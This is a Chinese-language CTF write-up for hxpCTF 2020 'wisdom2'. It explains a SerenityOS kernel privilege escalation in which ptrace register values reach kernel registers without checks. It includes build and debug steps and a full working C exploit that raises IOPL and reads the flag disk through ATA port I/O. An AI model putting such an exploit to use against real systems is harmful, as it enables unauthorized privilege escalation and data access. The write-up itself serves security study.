> 原文链接: https://www.anquanke.com//post/id/239844 


# hxpCTF2020 wisdom2：Ptrace参数未校验引发的SerenityOS内核提权


                                阅读量   
                                **102575**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01a045cc55efa2ecdf.jpg)](https://p2.ssl.qhimg.com/t01a045cc55efa2ecdf.jpg)



本题来源于hxpCTF 2020的wisdom2，是36c3 wisdom的升级版[CVE-2019-20172：36C3 wisdom中的SerenityOS内核提权](https://www.anquanke.com/post/id/228782)，该漏洞存在于serenityOS在2020年12月23日以前提交的版本。

[![](https://p2.ssl.qhimg.com/t01d858aa36094a490e.png)](https://p2.ssl.qhimg.com/t01d858aa36094a490e.png)

漏洞存在于sys$ptrace()与sys$sigreturn()方法，允许Userland修改Kerneland的寄存器，进一步可实现内核提权。通过修改eflags的IOPL标志位，可对系统I/O设备进行读写操作。



## Description

```
Description:
Oops, I did it again. :^)

This is commit # 4232874270015d940a2ba62c113bcf12986a2151 with the attached patch applied. Flag is in /dev/hdb.

Note that the setup of this task is perhaps a bit shaky: If you don’t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 10 minutes; you may contact us in case this causes problems for you.

Download:
wisdom2-c46f03732e9dceef.tar.xz (19.4 MiB)

Connection:
telnet 157.90.19.161 2323
```



## Build

拉取对应源码[https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151](https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151)

按照`Documentation/BuildInstructions.md`安装依赖，并且编译Toolchain和Kernel

先打上patch

```
git apply /path/to/hxp.patch
```

编译Toolchain

```
cd Toolchain
./BuildIt.sh
```

编译Kernel

```
cd ..
cd Build
cmake ..
make
make install
```

运行

```
make image
make run
```

[![](https://p2.ssl.qhimg.com/t01cdcf4b010069b064.png)](https://p2.ssl.qhimg.com/t01cdcf4b010069b064.png)

exp编译，将exp.cpp放`$SERENITY_ROOT/Userland`，cd进`$SERENITY_ROOT/Build`执行

```
make -C ./Userland/
```

在`$SERENITY_ROOT/Build/Userland`看到编译好的exp

[![](https://p3.ssl.qhimg.com/t01faafcd0dd35c28be.png)](https://p3.ssl.qhimg.com/t01faafcd0dd35c28be.png)

通过nc传exp

[![](https://p4.ssl.qhimg.com/t01809715181635356e.png)](https://p4.ssl.qhimg.com/t01809715181635356e.png)

执行报错，貌似这样编译出来的binary没法运行

[![](https://p0.ssl.qhimg.com/t01dc27945ca5844d6b.png)](https://p0.ssl.qhimg.com/t01dc27945ca5844d6b.png)

解决方法是将`exp`源码放在Userland目录后，cd到Build目录，执行

```
make
make install
make image
```

重新生成Kernel，exp成功执行

[![](https://p4.ssl.qhimg.com/t0190cd5d5b7569d12e.png)](https://p4.ssl.qhimg.com/t0190cd5d5b7569d12e.png)



## Exploiting

### <a class="reference-link" name="0x01%20Vulnerable"></a>0x01 Vulnerable

漏洞成因是：Ptrace传入regs组未加任何检查便传递给kernel_regs，导致可以任意修改Kernel寄存器值

[![](https://p0.ssl.qhimg.com/t01c5133f74fc4258d8.png)](https://p0.ssl.qhimg.com/t01c5133f74fc4258d8.png)

利用过程只需将`kernel_regs.eflags`的IOPL位(12/13 bits)置1，从而允许Userland访问系统I/O。

[![](https://p4.ssl.qhimg.com/t0132f849aa24a5eb74.png)](https://p4.ssl.qhimg.com/t0132f849aa24a5eb74.png)

### <a class="reference-link" name="0x02%20Debug"></a>0x02 Debug

修改`run.sh`，添加`-s`参数，启用调试接口

[![](https://p2.ssl.qhimg.com/t01cc5ad6302e8bd73d.png)](https://p2.ssl.qhimg.com/t01cc5ad6302e8bd73d.png)

gdb attach上去

[![](https://p0.ssl.qhimg.com/t0133fcc01663e195dc.png)](https://p0.ssl.qhimg.com/t0133fcc01663e195dc.png)

在`copy_ptrace_registers_into_kernel_registers`打断点

exp修改成将kernel_regs.edi置0xdeadbeef，编译后传到serenityOS

[![](https://p4.ssl.qhimg.com/t01bb330151644afc0d.png)](https://p4.ssl.qhimg.com/t01bb330151644afc0d.png)

Kernel的edi寄存器已被置0xdeadbeef

[![](https://p4.ssl.qhimg.com/t0156f518b7434f2869.png)](https://p4.ssl.qhimg.com/t0156f518b7434f2869.png)

### <a class="reference-link" name="0x03%20Read%20flag"></a>0x03 Read flag

flag.txt是以设备的形式挂载到`/dev/hdb`，由于现在只有Userland访问I/O的权限，没法调Kernel里的`get_device`等设备操纵方法（需要特权）

可以看到`Device::get_device`、`DiskDevice::read`方法位于Kerneland，Userland没法调，也就是没法利用wisdom1的方法去读flag

[![](https://p4.ssl.qhimg.com/t01de096fa3b3f088d1.png)](https://p4.ssl.qhimg.com/t01de096fa3b3f088d1.png)

通过`DiskDevice::read`方法去读flag，导致Processor Halt

[![](https://p3.ssl.qhimg.com/t01ba54b80d6cce5771.png)](https://p3.ssl.qhimg.com/t01ba54b80d6cce5771.png)

解决办法是利用现成的ATA PIO驱动程序读取flag，[https://github.com/dhavalhirdhav/LearnOS/blob/fe764387c9f01bf67937adac13daace909e4093e/drivers/ata/ata.c](https://github.com/dhavalhirdhav/LearnOS/blob/fe764387c9f01bf67937adac13daace909e4093e/drivers/ata/ata.c)

[![](https://p0.ssl.qhimg.com/t014cfd3c6210df858e.png)](https://p0.ssl.qhimg.com/t014cfd3c6210df858e.png)



## Script

完整的exploit

```
#include &lt;sys/cdefs.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;assert.h&gt;
#include &lt;LibC/sys/arch/i386/regs.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;stdlib.h&gt;

// IDE Reading Code taken from https://github.com/dhavalhirdhav/LearnOS/blob/fe764387c9f01bf67937adac13daace909e4093e/drivers/ata/ata.c

#define STATUS_BSY 0x80
#define STATUS_RDY 0x40
#define STATUS_DRQ 0x08
#define STATUS_DF 0x20
#define STATUS_ERR 0x01

// -Wall, -Werror :(
void raiseIOPL(void);
unsigned char port_byte_in(unsigned short port);
uint16_t port_word_in (uint16_t port);
void port_byte_out(unsigned short port, unsigned char data);
static void ATA_wait_BSY();
static void ATA_wait_DRQ();
void read_sectors_ATA_PIO(uint32_t target_address, uint32_t LBA, uint8_t sector_count);

unsigned char port_byte_in (unsigned short port) `{`
    unsigned char result;
    __asm__("in %%dx, %%al" : "=a" (result) : "d" (port));
    return result;
`}`

void port_byte_out (unsigned short port, unsigned char data) `{`
    __asm__("out %%al, %%dx" : : "a" (data), "d" (port));
`}`

uint16_t port_word_in (uint16_t port) `{`
    uint16_t result;
    __asm__("in %%dx, %%ax" : "=a" (result) : "d" (port));
    return result;
`}`

#define BASE 0x1F0

void read_sectors_ATA_PIO(uint32_t target_address, uint32_t LBA, uint8_t sector_count)
`{`
    ATA_wait_BSY();
    port_byte_out(BASE + 6,0xE0 | ((LBA &gt;&gt;24) &amp; 0xF) | 0x10 /* drive 2 */);
    port_byte_out(BASE + 2,sector_count);
    port_byte_out(BASE + 3, (uint8_t) LBA);
    port_byte_out(BASE + 4, (uint8_t)(LBA &gt;&gt; 8));
    port_byte_out(BASE + 5, (uint8_t)(LBA &gt;&gt; 16));
    port_byte_out(BASE + 7,0x20); //Send the read command

    uint16_t *target = (uint16_t*) target_address;

    for (int j =0;j&lt;sector_count;j++)
    `{`
        ATA_wait_BSY();
        ATA_wait_DRQ();
        for(int i=0;i&lt;256;i++)
            target[i] = port_word_in(BASE);
        target+=256;
    `}`
`}`

static void ATA_wait_BSY()   //Wait for bsy to be 0
`{`
    while(port_byte_in(BASE + 7)&amp;STATUS_BSY);
`}`
static void ATA_wait_DRQ()  //Wait fot drq to be 1
`{`
    while(!(port_byte_in(BASE + 7)&amp;STATUS_RDY));
`}`

// Actual exploit here
void raiseIOPL() `{`
    int pid = fork();
    if (pid != 0) `{`
        int status;
        pid_t g_pid = pid;
        if (ptrace(PT_ATTACH, g_pid, 0, 0) == -1) `{`
            perror("attach");
            exit(-1);
        `}`

        if (waitpid(g_pid, &amp;status, WSTOPPED | WEXITED) != g_pid || !WIFSTOPPED(status)) `{`
            perror("waitpid");
            exit(-1);
        `}`

        if (ptrace(PT_SYSCALL, g_pid, 0, 0) == -1) `{`
            perror("syscall");
            exit(-1);
        `}`

        if (waitpid(g_pid, &amp;status, WSTOPPED | WEXITED) != g_pid || !WIFSTOPPED(status)) `{`
            perror("waitpid");
            exit(-1);
        `}`

        PtraceRegisters regs = `{``}`;
        if (ptrace(PT_GETREGS, g_pid, &amp;regs, 0) == -1) `{`
            perror("getregs");
            exit(-1);
        `}`

        regs.cs = 3;
        regs.eflags |= 0x3000;

        if (ptrace(PT_SETREGS, g_pid, &amp;regs, 0) == -1) `{`
            perror("setregs");
            exit(-1);
        `}`

        if (ptrace(PT_DETACH, g_pid, 0, 0) == -1) `{`
            perror("detach");
            exit(-1);
        `}`

        exit(0);
    `}`

    sleep(2);
    puts("Testing if IOPL has been raised...");

    int flags = 0;
    asm volatile("pushf\npop %0\n" : "=r" (flags));
    if ((flags &amp; 0x3000) == 0x3000) `{`
        puts("Successfully raised IOPL!");
    `}` else `{`
        puts("Failed to raise IOPL!");
        exit(-1);
    `}`
`}`

int main(int, char**) `{`
    raiseIOPL();
    char data[512];
    memset(data, 0, 512);
    asm volatile("cli");
    read_sectors_ATA_PIO((uint32_t) data, 0, 1);
    asm volatile("sti");
    printf("Flag: %s\n", (char*) data);
    puts("Done");
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0197899cfc6b281770.png)
